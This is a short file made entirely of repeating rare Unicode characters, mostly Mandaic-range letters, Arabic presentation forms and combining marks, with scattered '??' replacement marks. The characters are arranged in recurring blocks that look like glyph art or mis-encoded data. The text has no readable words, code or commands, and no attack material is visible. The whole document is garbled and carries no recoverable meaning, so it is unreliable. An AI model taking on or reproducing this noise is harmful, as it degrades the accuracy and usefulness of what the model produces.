࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡙࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡛࡛؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??︫︫࡛࡛࡛࡛؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛𞋬𞋬𞋬??࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙